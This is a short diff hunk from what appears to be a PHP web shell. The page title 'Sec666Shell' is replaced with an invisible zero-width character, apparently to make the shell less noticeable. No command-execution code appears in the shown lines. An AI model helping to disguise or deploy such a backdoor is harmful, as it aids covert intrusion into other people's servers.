@@ -20,7 +20,7 @@ $_POST[$key] = stripslashes($value);
 echo '<!DOCTYPE HTML>
 <link rel="shortcut icon" href="https://i.ibb.co/f0tgWnV/1579475764733.png">
 <head>
-<title>Sec666Shell</title>
+<title>‌</title>
 <link href="https://fonts.googleapis.com/css?family=Calligraffitti&display=swap" rel="stylesheet"> 
 <link href="https://fonts.googleapis.com/css?family=Federant&display=swap" rel="stylesheet">
 <style>
